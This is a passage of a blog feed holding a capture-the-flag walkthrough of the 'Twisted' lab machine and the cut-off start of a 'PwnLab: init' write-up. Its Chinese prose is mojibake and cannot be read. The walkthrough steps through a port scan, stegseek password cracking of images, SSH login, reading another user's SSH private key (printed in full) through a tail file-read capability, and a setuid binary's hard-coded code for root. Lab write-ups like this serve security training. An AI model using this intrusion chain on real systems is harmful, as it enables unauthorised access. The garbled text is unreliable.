<h1 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># nmap -A 192.168.240.249  </span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>1-<span class="number">31</span> <span class="number">19</span>:<span class="number">26</span> CST</span><br><span class="line">Nmap scan report for <span class="number">192.168</span>.<span class="number">240.249</span></span><br><span class="line">Host is up (<span class="number">0.0018</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE VERSION</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span>   open  http    nginx <span class="number">1.14</span>.<span class="number">2</span></span><br><span class="line">|<span class="params">_http-title:</span> Site doesn&#x27;t have a title (text<span class="operator">/</span>html).</span><br><span class="line">|<span class="params">_http-server-header:</span> nginx<span class="symbol">/1.14.2</span></span><br><span class="line"><span class="number">2222</span><span class="symbol">/tcp</span> open  ssh     OpenSSH <span class="number">7.9</span>p1 Debian <span class="number">10</span><span class="operator">+</span>deb10u2 (protocol <span class="number">2.0</span>)</span><br><span class="line">| <span class="params">ssh-hostkey:</span> </span><br><span class="line">|   <span class="number">2048</span> <span class="number">67</span>:<span class="number">63</span>:a0:c9:<span class="number">8</span>b:<span class="number">7</span>a:f3:<span class="number">42</span>:ac:<span class="number">49</span>:ab:a6:a7:<span class="number">3</span>f:fc:ee (RSA)</span><br><span class="line">|   <span class="number">256</span> <span class="number">8</span>c:ce:<span class="number">87</span>:<span class="number">47</span>:f8:b8:<span class="number">1</span>a:<span class="number">1</span>a:<span class="number">78</span>:e5:b7:ce:<span class="number">74</span>:d7:f5:db (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> <span class="number">92</span>:<span class="number">94</span>:<span class="number">66</span>:<span class="number">0</span>b:<span class="number">92</span>:d3:cf:<span class="number">7</span>e:ff:e8:bf:<span class="number">3</span>c:<span class="number">7</span>b:<span class="number">41</span>:b7:<span class="number">5</span>a (ED25519)</span><br><span class="line">MAC <span class="params">Address:</span> <span class="number">76</span>:<span class="number">50</span>:<span class="number">9</span>A:<span class="number">7</span>A:<span class="number">10</span>:<span class="number">0</span>F (Unknown)</span><br><span class="line">Device <span class="params">type:</span> general purpose|router</span><br><span class="line"><span class="params">Running:</span> Linux <span class="number">4</span>.X|<span class="number">5</span>.X, MikroTik RouterOS <span class="number">7</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5</span> cpe:<span class="operator">/</span>o:mikrotik:routeros:<span class="number">7</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5.6</span>.<span class="number">3</span></span><br><span class="line">OS <span class="params">details:</span> Linux <span class="number">4.15</span> <span class="operator">-</span> <span class="number">5.19</span>, OpenWrt <span class="number">21.02</span> (Linux <span class="number">5.4</span>), MikroTik RouterOS <span class="number">7.2</span> <span class="operator">-</span> <span class="number">7.5</span> (Linux <span class="number">5.6</span>.<span class="number">3</span>)</span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line">Service <span class="params">Info:</span> <span class="params">OS:</span> Linux; <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">1.77</span> ms <span class="number">192.168</span>.<span class="number">240.249</span></span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">8.53</span> seconds</span><br></pre></td></tr></table></figure></div>
<p>å°±å¼€æ”¾äº†webå’Œssh<br>æˆ‘ä»¬å°±å»è®¿é—®ä¸€ä¸‹webæœ‰ä»€ä¹ˆä¿¡æ¯</p>
<h1 id="webæ¢æµ‹"><a href="#webæ¢æµ‹" class="headerlink" title="webæ¢æµ‹"></a>webæ¢æµ‹</h1><p>webç•Œé¢çš„å†…å®¹:</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# curl 192.168.240.249                            </span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>I love cats!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;cat-original.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Cat original&quot;</span>  <span class="attr">width</span>=<span class="string">&quot;400&quot;</span> <span class="attr">height</span>=<span class="string">&quot;400&quot;</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>But I prefer this one because seems different<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;cat-hidden.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;Cat Hidden&quot;</span> <span class="attr">width</span>=<span class="string">&quot;400&quot;</span> <span class="attr">height</span>=<span class="string">&quot;400&quot;</span>&gt;</span> </span><br></pre></td></tr></table></figure></div>
<p>ç»™äº†ä¸¤å¼ å›¾ç‰‡ å›¾ç‰‡çš„æ ·å­éƒ½ä¸€æ ·  æç¤ºæˆ‘ä»¬è¦æ‰¾åˆ°ä¸¤å¼ ç…§ç‰‡çš„ä¸åŒ<br>å…ˆç”¨diffæ¯”è¾ƒä¸¤å¼ å›¾ç‰‡</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# diff <span class="keyword">cat</span>-original.jpg <span class="keyword">cat</span>-hidden.jpg </span><br><span class="line">Binary <span class="keyword">files</span> <span class="keyword">cat</span>-original.jpg <span class="built_in">and</span> <span class="keyword">cat</span>-hidden.jpg differ</span><br></pre></td></tr></table></figure></div>
<p>è¿”å›æ˜¯ä¸¤ä¸ªå›¾ç‰‡çš„äºŒè¿›åˆ¶æ–‡ä»¶ä¸åŒ  å°è¯•ä½¿ç”¨äº†binwalkåˆ†ç¦»æ–‡ä»¶ä½†æ˜¯æ²¡æœ‰æ•ˆæœ<br>çœ‹äº†wpç”¨äº†stegseekè¿™ä¸ªå·¥å…·  å­¦ä¹ èµ·æ¥ <a href="/posts/15173.html" title="kaliå·¥å…·ç¬”è®°">kaliå·¥å…·ç¬”è®°</a></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PROLOG"><figure class="iseeu highlight /prolog"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# stegseek -wl /usr/share/wordlists/rockyou.txt cat-original.jpg</span><br><span class="line"><span class="symbol">StegSeek</span> <span class="number">0.6</span> - https://github.com/<span class="symbol">RickdeJager</span>/<span class="symbol">StegSeek</span></span><br><span class="line"></span><br><span class="line">[i] <span class="symbol">Found</span> passphrase: <span class="string">&quot;westlife&quot;</span></span><br><span class="line">[i] <span class="symbol">Original</span> filename: <span class="string">&quot;markus.txt&quot;</span>.</span><br><span class="line">[i] <span class="symbol">Extracting</span> to <span class="string">&quot;cat-original.jpg.out&quot;</span>.</span><br><span class="line"></span><br><span class="line">                                                                                                                    </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# stegseek -wl /usr/share/wordlists/rockyou.txt cat-hidden.jpg  </span><br><span class="line"><span class="symbol">StegSeek</span> <span class="number">0.6</span> - https://github.com/<span class="symbol">RickdeJager</span>/<span class="symbol">StegSeek</span></span><br><span class="line"></span><br><span class="line">[i] <span class="symbol">Found</span> passphrase: <span class="string">&quot;sexymama&quot;</span></span><br><span class="line">[i] <span class="symbol">Original</span> filename: <span class="string">&quot;mateo.txt&quot;</span>.</span><br><span class="line">[i] <span class="symbol">Extracting</span> to <span class="string">&quot;cat-hidden.jpg.out&quot;</span>.</span><br></pre></td></tr></table></figure></div>
<p>æˆåŠŸåˆ†ç¦»å‡ºæ–‡ä»¶</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="STATA"><figure class="iseeu highlight /stata"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# <span class="keyword">ls</span></span><br><span class="line">a.txt  <span class="keyword">cat</span>-hidden.jpg  <span class="keyword">cat</span>-hidden.jpg.<span class="keyword">out</span>  <span class="keyword">cat</span>-original.jpg  <span class="keyword">cat</span>-original.jpg.<span class="keyword">out</span></span><br><span class="line">                                                                                                                    </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# <span class="keyword">cat</span> <span class="keyword">cat</span>-hidden.jpg.<span class="keyword">out</span>                                                                            </span><br><span class="line">thisismypassword</span><br><span class="line">                                                                                                                    </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# <span class="keyword">cat</span> <span class="keyword">cat</span>-original.jpg.<span class="keyword">out</span> </span><br><span class="line">markuslovesbonita</span><br></pre></td></tr></table></figure></div>
<p>å¾—åˆ°ä¸€ä¸ªå¯†ç   å¹¶ä¸”ä»è¿™ä¸ªå¯†ç å¯ä»¥æ¨æ–­ç”¨æˆ·åæ˜¯ markus ç™»å½•åˆ°sshä¸­  </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VBNET"><figure class="iseeu highlight /vbnet"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# ssh markus@<span class="number">192.168</span>.<span class="number">240.249</span> -p <span class="number">2222</span></span><br><span class="line">The authenticity <span class="keyword">of</span> host <span class="comment">&#x27;[192.168.240.249]:2222 ([192.168.240.249]:2222)&#x27; can&#x27;t be established.</span></span><br><span class="line">ED25519 <span class="keyword">key</span> fingerprint <span class="built_in">is</span> SHA256:+Vy+<span class="number">50</span>OqnmO0eOU2nhxE0uNjMjXrtpHTmrYtml4yF3s.</span><br><span class="line">This <span class="keyword">key</span> <span class="built_in">is</span> <span class="built_in">not</span> known <span class="keyword">by</span> any other names.</span><br><span class="line">Are you sure you want <span class="keyword">to</span> <span class="keyword">continue</span> connecting (yes/no/[fingerprint])? yes</span><br><span class="line"><span class="symbol">Warning:</span> Permanently added <span class="comment">&#x27;[192.168.240.249]:2222&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line">markus@<span class="number">192.168</span>.<span class="number">240.249</span><span class="comment">&#x27;s password: </span></span><br><span class="line">Linux twisted <span class="number">4.19</span>.<span class="number">0</span>-<span class="number">9</span>-amd64 #<span class="number">1</span> SMP Debian <span class="number">4.19</span>.<span class="number">118</span>-<span class="number">2</span>+deb10u1 (<span class="number">2020</span>-<span class="number">06</span>-<span class="number">07</span>) x86_64</span><br><span class="line"></span><br><span class="line">The programs included <span class="keyword">with</span> the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> <span class="keyword">each</span> program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes <span class="keyword">with</span> ABSOLUTELY NO WARRANTY, <span class="keyword">to</span> the extent</span><br><span class="line">permitted <span class="keyword">by</span> applicable law.</span><br><span class="line">markus@twisted:~$ </span><br></pre></td></tr></table></figure></div>
<p>æˆåŠŸæ‹¿åˆ°shell</p>
<h1 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h1><p>è¿™ä¸ªç”¨æˆ·æ²¡æœ‰sudoå‘½ä»¤æƒé™  ä¹Ÿæ²¡æœ‰å¯ä»¥åˆ©ç”¨çš„suid<br>è¿™ä¸ªç”¨æˆ·ä¸‹æœ‰ä¸€ä¸ªnote.txt</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">markus<span class="variable">@twisted</span><span class="symbol">:~</span><span class="variable">$ </span>cat note.txt </span><br><span class="line"><span class="title class_">Hi</span> bonita,</span><br><span class="line">I have saved your id_rsa <span class="symbol">here:</span> /var/cache/apt/id_rsa</span><br><span class="line"><span class="title class_">Nobody</span> can find it. </span><br></pre></td></tr></table></figure></div>
<p>æç¤ºæœ‰ä¸€ä¸ªç”¨æˆ·å«åšbonita åˆ©ç”¨id_rsaæ–‡ä»¶ç™»å½•åˆ°è¿™ä¸ªç”¨æˆ·<br>ç°åœ¨æ²¡æœ‰æƒé™è¯»å–è¿™ä¸ªæ–‡ä»¶<br>ä½†æ˜¯homeç›®å½•ä¸‹é¢æ‰¾åˆ°ä¸¤ä¸ªå…¶ä»–ç”¨æˆ·çš„æ–‡ä»¶å¤¹ </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">markus<span class="variable">@twisted</span><span class="symbol">:/home</span><span class="variable">$ </span>ls</span><br><span class="line">bonita  markus  mateo</span><br><span class="line">markus<span class="variable">@twisted</span><span class="symbol">:/home</span><span class="variable">$ </span>cd bonita/</span><br><span class="line">markus<span class="variable">@twisted</span><span class="symbol">:/home/bonita</span><span class="variable">$ </span>ls</span><br><span class="line">beroot  user.txt</span><br></pre></td></tr></table></figure></div>
<p>ä½†æ˜¯éƒ½æ²¡æœ‰æƒé™ æ‰€ä»¥ç°åœ¨å¿…é¡»è¦æ‰¾åˆ°åˆ©ç”¨id_rsaçš„åŠæ³•<br>æ²¡æœ‰æ€è·¯ çœ‹wpï¼Œ å¤§ä½¬ç”¨äº†getcapè¿™ä¸ªå‘½ä»¤æŸ¥çœ‹æ–‡ä»¶çš„æƒåˆ©  è®°å½•è®°å½•<a href="/posts/49809.html" title="linuxæŒ‡ä»¤ç¬”è®°">linuxæŒ‡ä»¤ç¬”è®°</a></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRYSTAL"><figure class="iseeu highlight /crystal"><table><tr><td class="code"><pre><span class="line">markus<span class="variable">@twisted</span>:~<span class="variable">$ </span>getcap / -r <span class="number">2</span>&gt;<span class="regexp">/dev/null</span></span><br><span class="line">markus<span class="variable">@twisted</span>:~<span class="variable">$ </span>/usr/sbin/getcap / -r <span class="number">2</span>&gt;<span class="regexp">/dev/null</span></span><br><span class="line"><span class="regexp">/usr/bin</span><span class="regexp">/ping = cap_net_raw+ep</span></span><br><span class="line"><span class="regexp">/usr</span><span class="regexp">/bin/tail</span> = cap_dac_read_search+ep</span><br></pre></td></tr></table></figure></div>
<p>å‘ç°tailæŒ‡ä»¤å¯ä»¥ç»•è¿‡æ–‡ä»¶çš„è¯»å’Œæœç´¢æƒé™  æ‰€ä»¥ç”¨tailæŒ‡ä»¤è·å–id_rsaå†…å®¹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">markus@twisted:~$ tail <span class="operator">-</span>n <span class="number">50</span> <span class="symbol">/var/cache/apt/id_rsa</span></span><br><span class="line"><span class="operator">-</span>----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn</span><br><span class="line">NhAAAAAwEAAQAAAQEA8NIseqX1B1YSHTz1A4rFWhjIJffs5vSbAG0Vg2iTa<span class="operator">+</span>xshyrmk6zd</span><br><span class="line">FyguFUO7tN2TCJGTomDTXrG<span class="symbol">/KvWaucGvIAXpgV1lQsQkBV/VNrVC1Ioj/Fx3hUaSCC4PBS</span></span><br><span class="line">olvmldJg2habNOUGA4EBKlTwfDi<span class="operator">+</span>vjDP8d77mF<span class="operator">+</span>rvA3EwR3vj37AiXFk5hBEsqr9cWeTr1</span><br><span class="line">vD5282SncYtJb<span class="symbol">/Zx0eOa6VVFqDfOB7LKZA2QYIbfR7jezOdX+/nlDKX8Xp07wimFuMJpcF</span></span><br><span class="line">gFnch7ptoxAqe0M0UIEzP<span class="operator">+</span>G2ull3m80G5L7Q<span class="symbol">/3acg14ULnNVs5dTJWPO2Fp7J2qKW+4A5C</span></span><br><span class="line">tt0G5sIBpQAAA8hHx4cBR8eHAQAAAAdzc2gtcnNhAAABAQDw0ix6pfUHVhIdPPUDisVaGM</span><br><span class="line">gl9<span class="operator">+</span>zm9JsAbRWDaJNr7GyHKuaTrN0XKC4VQ7u03ZMIkZOiYNNesb8q9Zq5wa8gBemBXWVC</span><br><span class="line">xCQFX9U2tULUiiP8XHeFRpIILg8FKiW<span class="operator">+</span>aV0mDaFps05QYDgQEqVPB8OL6<span class="operator">+</span>MM<span class="symbol">/x3vuYX6u8</span></span><br><span class="line">DcTBHe<span class="operator">+</span>PfsCJcWTmEESyqv1xZ5OvW8PnbzZKdxi0lv9nHR45rpVUWoN84HsspkDZBght9H</span><br><span class="line">uN7M51f7<span class="operator">+</span>eUMpfxenTvCKYW4wmlwWAWdyHum2jECp7QzRQgTM<span class="symbol">/4ba6WXebzQbkvtD/dpyD</span></span><br><span class="line">XhQuc1Wzl1MlY87YWnsnaopb7gDkK23QbmwgGlAAAAAwEAAQAAAQAuUW5GpLbNE2vmfbvu</span><br><span class="line">U3mDy7JrQxUokrFhUpnJrYp1PoLdOI4ipyPa<span class="operator">+</span>VprspxevCM0ibNojtD4rJ1FKPn6cls5gI</span><br><span class="line">mZ3RnFzq3S7sy2egSBlpQ3TJ2cX6dktV8kMigSSHenAwYhq2ALq4X86WksGyUsO1FvRX4<span class="symbol">/</span></span><br><span class="line">hmJTiFsew<span class="operator">+</span><span class="number">7</span>IAKE<span class="operator">+</span>oQHMzpjMGyoiPXfdaI3sa10L2WfkKs4I4K<span class="symbol">/v/x2pW78HIktaQPutro</span></span><br><span class="line">nxD8<span class="operator">/</span>fwGxQnseC69E6vdh<span class="operator">/</span><span class="number">5</span>tS8<span class="operator">+</span>lDEfYDz4oEy9AP26Hdtho0D6E9VT9T<span class="symbol">//2vynHLbmSXK</span></span><br><span class="line">mPbr04h5i9C3h81rh4sAHs9nVAEe3dmZtmZxoZPOJKRhAAAAgFD<span class="operator">+</span>g8BhMCovIBrPZlHCu<span class="operator">+</span></span><br><span class="line">bUlbizp9qfXEc8BYZD3frLbVfwuL6dafDVnj7EqpabmrTLFunQG<span class="operator">+</span><span class="number">9</span><span class="symbol">/PI6bN+iwloDlugtq</span></span><br><span class="line">yzvf924Kkhdk<span class="operator">+</span>N366FLDt06p2tkcmRljm9kKMS3lBPMu9C4<span class="operator">+</span>fgo9LCyphiXrm7UbJHDVSP</span><br><span class="line">UvPg4Fg<span class="symbol">/nqAAAAgQD9Q83ZcqDIx5c51fdYsMUCByLby7OiIfXukMoYPWCE2yRqa53PgXjh</span></span><br><span class="line">V2URHPPhqFEa<span class="operator">+</span>iB138cSgCU3RxbRK7Qm1S7<span class="symbol">/P44fnWCaNu920iLed5z2fzvbTytE/h9QpJ</span></span><br><span class="line">LlecEv2Hx03xyRZBsHFkMf<span class="operator">+</span>dMDC0ueU692Gl7YxRw<span class="operator">+</span>Lic0PQAAAIEA82v3Ytb97SghV7rz</span><br><span class="line">a0S5t7v8pSSYZAW0OJ3DJqaLtEvxhhomduhF71T0iw0wy8rSH7j2M5PGCtCZUa2<span class="symbol">/OqQgKF</span></span><br><span class="line">eERnqQPQSgM0PrATtihXYCTGbWo69NUMcALah0gT5i6nvR1Jr4220InGZEUWHLfvkGTitu</span><br><span class="line">D0POe<span class="operator">+</span>rjV4B7EYkAAAAOYm9uaXRhQHR3aXN0ZWQBAgMEBQ<span class="operator">==</span></span><br><span class="line"><span class="operator">-</span>----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure></div>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€<span class="params">(rootã‰¿kakeru)</span>-[~<span class="string">/tmp</span>]</span><br><span class="line">â””â”€<span class="comment"># chmod 600 id_rsa</span></span><br><span class="line">                                                                                                                    </span><br><span class="line">â”Œâ”€â”€<span class="params">(rootã‰¿kakeru)</span>-[~<span class="string">/tmp</span>]</span><br><span class="line">â””â”€<span class="comment"># ssh bonita@192.168.240.249 -p 2222 -i id_rsa</span></span><br></pre></td></tr></table></figure>
<p>æˆåŠŸæ‹¿åˆ°bonitaçš„shell<br>ç›®å½•ä¸‹é¢æœ‰ä¸€ä¸ªç¨‹åº</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">bonita</span>@twisted:~$ file beroot </span><br><span class="line"><span class="attribute">beroot</span>: setuid, setgid ELF <span class="number">64</span>-bit LSB pie executable, x86-<span class="number">64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-<span class="number">64</span>.so.<span class="number">2</span>, for GNU/Linux <span class="number">3</span>.<span class="number">2</span>.<span class="number">0</span>, BuildID[sha1]=fecfbde059505a54f66d3229cc9ebb78f997a7ba, not stripped</span><br><span class="line"><span class="attribute">bonita</span>@twisted:~$ ./beroot </span><br><span class="line"><span class="attribute">Enter</span> the code:</span><br></pre></td></tr></table></figure></div>
<p>ä¸‹è½½åˆ°æœ¬åœ°ç”¨idaæŸ¥çœ‹<br><img src="https://pic1.imgdb.cn/item/679cc6a9d0e0a243d4f8cd31.png"><br>çœ‹åˆ°codeå¯†ç æ˜¯5880<br>ç„¶åå°±å¯ä»¥æ‹¿åˆ°rootçš„shell</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">bonita<span class="variable">@twisted</span><span class="symbol">:~</span><span class="variable">$ </span>./beroot </span><br><span class="line"><span class="title class_">Enter</span> the <span class="symbol">code:</span></span><br><span class="line"> <span class="number">5880</span></span><br><span class="line">root<span class="variable">@twisted</span><span class="symbol">:~</span><span class="comment"># ls</span></span><br><span class="line">beroot  user.txt</span><br><span class="line">root<span class="variable">@twisted</span><span class="symbol">:~</span><span class="comment"># cdd /root</span></span><br><span class="line"><span class="symbol">bash:</span> <span class="symbol">cdd:</span> command <span class="keyword">not</span> found</span><br><span class="line">root<span class="variable">@twisted</span><span class="symbol">:~</span><span class="comment"># cd /root</span></span><br><span class="line">root<span class="variable">@twisted</span><span class="symbol">:/root</span><span class="comment"># ls</span></span><br><span class="line">root.txt</span><br><span class="line">root<span class="variable">@twisted</span><span class="symbol">:/root</span><span class="comment"># cat root.txt </span></span><br><span class="line"><span class="title class_">HMVwhereismycat</span></span><br></pre></td></tr></table></figure></div>
<p>ç»“æŸ </p>
<p>æ€»ç»“ï¼šéš¾ç‚¹åœ¨äº1.æ€ä¹ˆä»ä¸¤å¼ å›¾ç‰‡ä¸­è·å¾—å¯†ç  2.å¦‚ä½•ä»ç¬¬ä¸€ä¸ªshellæ‹¿åˆ°id_rsa 3.å¦‚ä½•åˆ©ç”¨berootè¿™ä¸ªç¨‹åº<br>æ–°çŸ¥è¯†ï¼šstegseekå›¾ç‰‡éšå†™å·¥å…·  &#x2F;usr&#x2F;bin&#x2F;getcap æƒé™æŸ¥çœ‹  idaæŒ‰tapå¿«æ·é”®çœ‹æºç </p>
]]></content>
      <categories>
        <category>é¶åœº</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>HMV</tag>
        <tag>é¶åœº</tag>
      </tags>
  </entry>
  <entry>
    <title>Vulnhub-Pwnlab:init</title>
    <url>/posts/36422.html</url>
    <content><![CDATA[<p>ä¾ç„¶æ˜¯cispä¸¾å¾—ä¾‹å­</p>
<span id="more"></span>
<p>é¶æœºä»‹ç»<br>Wellcome to â€œPwnLab: initâ€, my first Boot2Root virtual machine. Meant to be easy, I hope you enjoy it and maybe learn something. The purpose of this CTF is to get root and read de flag.</p>
<p>Can contact me at: <a href="mailto:&#99;&#108;&#x61;&#x6f;&#x72;&#x40;&#112;&#119;&#110;&#108;&#x61;&#98;&#46;&#110;&#101;&#116;">claor@pwnlab.net</a> or on Twitter: @Chronicoder</p>
<p>Difficulty: Low<br>Flag: &#x2F;root&#x2F;flag.txt</p>
<h1 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="LIVECODESERVER"><figure class="iseeu highlight /livecodeserver"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># nmap 192.168.1.11</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( <span class="keyword">https</span>://nmap.org ) <span class="keyword">at</span> <span class="number">2025</span><span class="number">-08</span><span class="number">-19</span> <span class="number">10</span>:<span class="number">48</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> anonymous (<span class="number">192.168</span><span class="number">.1</span><span class="number">.11</span>)</span><br><span class="line">Host is up (<span class="number">0.00071</span>s latency).</span><br><span class="line">Not shown: <span class="number">997</span> closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE</span><br><span class="line"><span class="number">80</span>/tcp   <span class="built_in">open</span>  <span class="keyword">http</span></span><br><span class="line"><span class="number">111</span>/tcp  <span class="built_in">open</span>  rpcbind</span><br><span class="line"><span class="number">3306</span>/tcp <span class="built_in">open</span>  mysql</span><br><span class="line">MAC Address: <span class="number">00</span>:<span class="number">0</span>C:<span class="number">29</span>:F0:<span class="number">7</span>D:<span class="number">9</span>E (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">1.28</span> <span class="built_in">seconds</span></span><br></pre></td></tr></table></figure></div>

<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><p>è¿›å…¥webä¹‹åæœ‰ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ çš„ç•Œé¢ï¼Œä½†æ˜¯è¦å…ˆç™»å½•<br><img src="https://pic1.imgdb.cn/item/68a3e8f558cb8da5c834dbc2.png"><br>å…ˆç”¨bpçˆ†ç ´ä¸€ä¸‹å¯†ç   â€“&gt; æ²¡æœ‰çˆ†ç ´å‡ºæ¥<br>é¦–é¡µå°±è¿™äº›å†…å®¹äº†ï¼Œç°åœ¨æ‰«ä¸€ä¸‹ç›®å½•</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[~<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># dirsearch -u 192.168.1.11</span></span><br><span class="line"><span class="operator">/</span>usr<span class="operator">/</span>lib<span class="operator">/</span>python3<span class="operator">/</span>dist-packages<span class="operator">/</span>dirsearch<span class="operator">/</span>dirsearch.py:<span class="number">23</span>: <span class="params">DeprecationWarning:</span> pkg_resources is deprecated as an API. See https:<span class="symbol">//setuptools.pypa.io/en/latest/pkg_resources.html</span></span><br><span class="line">  from pkg_resources <span class="built_in">import</span> DistributionNotFound, VersionConflict</span><br><span class="line"></span><br><span class="line">  _|. _ _  _  _  _ _|_    v0.<span class="number">4.3</span></span><br><span class="line"> (_<span class="operator">||</span>| _) (<span class="operator">/</span>_(_<span class="operator">||</span> (_| )</span><br><span class="line"></span><br><span class="line"><span class="params">Extensions:</span> php, aspx, jsp, html, js | HTTP <span class="params">method:</span> GET | <span class="params">Threads:</span> <span class="number">25</span> | Wordlist <span class="params">size:</span> <span 